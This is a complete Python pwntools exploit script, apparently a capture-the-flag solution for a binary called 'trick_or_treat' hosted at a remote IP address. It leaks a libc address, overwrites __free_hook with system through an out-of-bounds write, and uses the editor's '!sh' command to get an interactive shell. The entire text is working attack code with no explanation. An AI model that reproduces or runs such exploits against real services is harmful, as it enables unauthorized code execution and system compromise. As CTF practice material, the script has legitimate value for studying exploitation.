from pwn import *

libc = ELF("./libc.so.6")

#r = process('./trick_or_treat')
r = remote('3.112.41.140', 56746)

r.sendlineafter(':', str(0x2000000))
r.recvuntil('Magic:')
addr = int(r.recvline().strip(), 16)
libc_base = addr + 0x2000ff0
print "libc_base @ ", hex(libc_base)
free_hook = libc_base + libc.symbols['__free_hook']
print "free_hook @ ", hex(free_hook)
system = libc_base + libc.symbols['system']
print "system @ ", hex(system)

offset = (free_hook - addr)//8
print "offset = ", hex(offset)

r.sendlineafter('Value:', hex(offset)[2:] + ' ' + str(hex(system)[2:]))
r.sendlineafter('Value:', 'a'*0x1000 + ' ' + 'ed')
r.sendline("!sh")

r.interactive()